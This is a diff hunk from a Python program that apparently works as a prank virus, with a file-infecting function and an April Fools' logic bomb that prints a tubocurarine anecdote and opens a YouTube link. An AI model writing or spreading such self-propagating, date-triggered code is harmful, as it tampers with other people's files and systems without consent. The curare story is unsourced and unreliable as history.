@@ -32,7 +32,7 @@ def infect(filestoinfect):
          f.close()
 def explode():
       if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1:
-             print ("SHOTGUN")
+             print ("For generations, the indigenous peoples of South American used blow darts laced with paralytic plant extract to hunt their prey. In the 1800s, English physicians who interacted with these indigenous South Americans recognized the possible uses of this paralytic agent, now known as tubocurarine, as an anesthetic agent for surgeries. Physicians noticed that animals under the influence of tubocurarine would become temporarily immobilized but would recover after a period of paralysis. According to these physicians, this discovery would revolutionize surgery as an anesthetic agent. So confident were they in their discovery that one of the physicians volunteered to undergo surgery under the influence of tubocurarine to demonstrate its effectiveness. Unfortunately, he failed to realize that, although the drug was an effective paralyzing agent, it did not have any effect on the sensory receptors of the body, so he felt every cut of the surgery without being able to move or do anything about it.")
              webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
 def getfucked():
 
